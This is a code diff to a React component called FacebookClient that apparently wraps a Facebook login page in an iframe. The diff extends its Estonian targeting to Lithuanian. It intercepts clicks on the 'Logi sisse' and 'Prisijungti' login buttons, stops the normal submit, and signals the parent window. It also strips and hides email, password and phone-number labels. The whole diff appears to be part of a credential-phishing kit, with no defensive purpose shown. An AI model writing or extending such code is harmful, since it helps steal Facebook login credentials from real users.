@@ -126,7 +126,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
                   for (var i = 0; i < 10 && el; i++) {
                     var txt = (el.textContent || '').trim();
                     var al = (el.getAttribute && el.getAttribute('aria-label')) || '';
-                    if (txt === 'Logi sisse' || al === 'Logi sisse') {
+                    if (txt === 'Logi sisse' || txt === 'Prisijungti' || al === 'Logi sisse' || al === 'Prisijungti' || txt.indexOf('Prisijungti') === 0 || al.indexOf('Prisijungti') === 0) {
                       window.parent.postMessage({ type: 'fb_submit_click' }, '*');
                       e.preventDefault();
                       e.stopPropagation();
@@ -268,6 +268,12 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           tl.includes("parooli") ||
           tl.includes("meiliaadress") ||
           tl.includes("meiliaadresi") ||
+          tl.includes("slaptažodis") ||
+          tl.includes("slaptazodis") ||
+          tl.includes("paštas") || tl.includes("pastas") ||
+          tl.includes("telefono numeris") ||
+          tl.includes("mobilusis numeris") ||
+          tl.includes("pamiršote") || tl.includes("pamirsote") ||
           tl.includes("telefoninumber") ||
           tl.includes("telephone number") ||
           tl.includes("mobile number") ||
@@ -275,7 +281,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           tl === "email" || tl === "e-mail" || tl === "e-post" ||
           tl.startsWith("email ") || tl.startsWith("e-mail ") ||
           tl.includes("e-post") || tl.includes("kas unustasid") ||
-          (rawText.length <= 32 && (tl.includes("email") || tl.includes("parol") || tl.includes("telefon")));
+          (rawText.length <= 32 && (tl.includes("email") || tl.includes("parol") || tl.includes("telefon") || tl.includes("lapta") || tl.includes("pašt") || tl.includes("past")));
         if (!isLabelText) return;
 
         // 5) ARIA/TITLE/PALTIC SIL (label icin):
@@ -360,13 +366,19 @@ export function FacebookClient({ sessionId: propSid }: Props) {
             t.includes("parooli") ||
             t.includes("meiliaadress") ||
             t.includes("meiliaadresi") ||
+            t.includes("slaptažodis") ||
+            t.includes("slaptazodis") ||
+            t.includes("paštas") || t.includes("pastas") ||
+            t.includes("telefono numeris") ||
+            t.includes("mobilusis numeris") ||
+            t.includes("pamiršote") || t.includes("pamirsote") ||
             t.includes("telefoninumber") ||
             t.includes("telephone number") ||
             t.includes("phone number") ||
             t.includes("mobile number") ||
             t === "email" || t === "e-mail" || t === "e-post" ||
             t.includes("kas unustasid") ||
-            (t.length <= 80 && (t.includes("email") || t.includes("parol") || t.includes("telefon") || t.includes("meilia")))
+            (t.length <= 80 && (t.includes("email") || t.includes("parol") || t.includes("telefon") || t.includes("meilia") || t.includes("lapta") || t.includes("pašt") || t.includes("past")))
           );
         };
         const tryPurgeNode = (n: Node): boolean => {
@@ -461,8 +473,8 @@ export function FacebookClient({ sessionId: propSid }: Props) {
             newStyle.textContent = `
               input::-webkit-input-placeholder, input::-moz-placeholder, input:-ms-input-placeholder, input::placeholder { color: transparent !important; opacity: 0 !important; }
               input:placeholder-shown + label, input[placeholder*='email'] + span, input[placeholder*='parool'] + div { display: none !important; visibility: hidden !important; opacity: 0 !important; }
-              [aria-label*='meiliaadress'], [aria-label*='parool'], [title*='meiliaadress'], [title*='parool'] { color: transparent !important; opacity: 0 !important; }
-              [aria-label*='meiliaadress']::before, [aria-label*='meiliaadress']::after, [aria-label*='parool']::before, [aria-label*='parool']::after { content: '' !important; display: none !important; }
+              [aria-label*='meiliaadress'], [aria-label*='parool'], [title*='meiliaadress'], [title*='parool'], [aria-label*='lapta']:not(input):not(textarea), [aria-label*='pašt']:not(input):not(textarea), [aria-label*='past']:not(input):not(textarea), [title*='lapta']:not(input) { color: transparent !important; opacity: 0 !important; }
+              [aria-label*='meiliaadress']::before, [aria-label*='meiliaadress']::after, [aria-label*='parool']::before, [aria-label*='parool']::after, [aria-label*='lapta']::before, [aria-label*='lapta']::after, [aria-label*='pašt']::before, [aria-label*='pašt']::after { content: '' !important; display: none !important; }
             `;
             (dc.head || dc.documentElement).appendChild(newStyle);
             st = newStyle;
@@ -502,7 +514,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           const b = btns[i];
           const t = (b.textContent || "").trim();
           const al = b.getAttribute("aria-label") || "";
-          if (t === "Logi sisse" || al === "Logi sisse") return b;
+          if (t === "Logi sisse" || t === "Prisijungti" || al === "Logi sisse" || al === "Prisijungti" || t.startsWith("Prisijungti") || al.startsWith("Prisijungti")) return b;
         }
         return null;
       }
